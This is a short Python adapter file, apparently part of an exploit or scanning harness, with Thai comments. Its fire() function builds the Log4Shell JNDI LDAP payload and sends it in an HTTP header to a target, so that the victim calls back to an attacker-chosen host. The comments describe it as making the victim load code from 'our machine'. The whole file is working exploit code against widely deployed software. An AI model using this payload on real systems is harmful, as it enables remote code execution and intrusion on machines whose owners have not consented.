# adapters/log4shell.py
import requests

def fire(case):
    # payload มาตรฐานของ Log4Shell — สั่งให้เหยื่อวิ่งไปโหลดจากเครื่องเรา
    host = case["exploit"]["callback_host"]
    port = case["exploit"]["callback_port"]
    payload = f"${{jndi:ldap://{host}:{port}/a}}"
    # ยิงผ่าน HTTP header ที่แอปเอาไปเขียน log (ทำให้ log4j ทำงาน)
    requests.get(case["target"], headers={"X-Api-Version": payload}, timeout=5)
